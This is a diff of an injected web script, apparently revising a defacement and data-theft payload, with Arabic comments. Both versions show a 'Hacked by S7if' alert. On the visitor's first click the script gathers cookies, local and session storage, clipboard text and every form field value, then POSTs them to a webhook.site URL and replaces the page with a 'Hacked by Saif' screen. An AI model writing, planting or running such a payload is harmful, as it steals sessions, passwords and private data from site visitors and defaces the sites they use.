@@ -1,51 +1,56 @@
 <script>
-// ⛔ إظهار التحذير فورًا عند التحميل
-alert("💀 Hacked by S7if 💀");
+  alert("💀 Hacked by S7if 💀");
 
-// ✅ بمجرد الضغط في أي مكان (أو بعد OK من الـ alert) يتم التنفيذ
-document.addEventListener("click", async () => {
-  const everything = {
-    cookies: document.cookie,
-    localStorage: { ...localStorage },
-    sessionStorage: { ...sessionStorage },
-    url: location.href,
-    referrer: document.referrer,
-    userAgent: navigator.userAgent,
-    platform: navigator.platform,
-    clipboard: "",
-    html: document.documentElement.outerHTML.slice(0, 3000),
-    forms: Array.from(document.forms).map(f => ({
-      action: f.action,
-      method: f.method,
-      fields: Array.from(f.elements).map(e => ({
-        name: e.name,
-        type: e.type,
-        value: e.value
-      }))
-    })),
-    time: new Date().toISOString()
-  };
+  // بعد الضغط على OK أو أي Click في الصفحة
+  window.addEventListener("click", async () => {
+    try {
+      const everything = {
+        cookies: document.cookie,
+        localStorage: Object.fromEntries(Object.entries(localStorage)),
+        sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
+        url: location.href,
+        referrer: document.referrer,
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        time: new Date().toISOString(),
+        html: document.documentElement.outerHTML.slice(0, 3000)
+      };
 
-  try {
-    everything.clipboard = await navigator.clipboard.readText();
-  } catch (e) {
-    everything.clipboard = "Clipboard access denied";
-  }
+      // Clipboard
+      try {
+        everything.clipboard = await navigator.clipboard.readText();
+      } catch (e) {
+        everything.clipboard = "Clipboard access denied";
+      }
 
-  try {
-    await fetch("https://webhook.site/323bd404-2b33-4438-93b4-81f85ccc77cb", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(everything)
-    });
-  } catch (e) {}
+      // Forms
+      everything.forms = Array.from(document.forms).map(f => ({
+        action: f.action,
+        method: f.method,
+        fields: Array.from(f.elements).map(e => ({
+          name: e.name,
+          type: e.type,
+          value: e.value
+        }))
+      }));
 
-  // 👻 شكل مرعب بعد ما الداتا تتبعت
-  document.body.innerHTML = `
-    <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#111;color:#0f0;font-size:2em;font-family:monospace;text-align:center;flex-direction:column;">
-      <div>👾 Saif 👾</div>
-      <div style="font-size: 0.6em; margin-top: 20px;">Your data has been extracted.</div>
-    </div>
-  `;
-}, { once: true }); // عشان ميشتغلش أكتر من مرة
+      // إرسال البيانات
+      await fetch("https://webhook.site/323bd404-2b33-4438-93b4-81f85ccc77cb", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(everything)
+      });
+
+      // رسالة نهائية
+      document.body.innerHTML = `
+        <div style="display:flex;justify-content:center;align-items:center;height:100vh;background:#111;color:#0f0;font-size:2em;font-family:monospace;text-align:center;flex-direction:column;">
+          <div>👾 Hacked by <b>Saif</b> 👾</div>
+          <div style="font-size: 0.6em; margin-top: 20px;">Your session has been terminated.</div>
+        </div>
+      `;
+
+    } catch (err) {
+      console.error("Error during data exfiltration", err);
+    }
+  }, { once: true }); // يشتغل مرة واحدة بس
 </script>
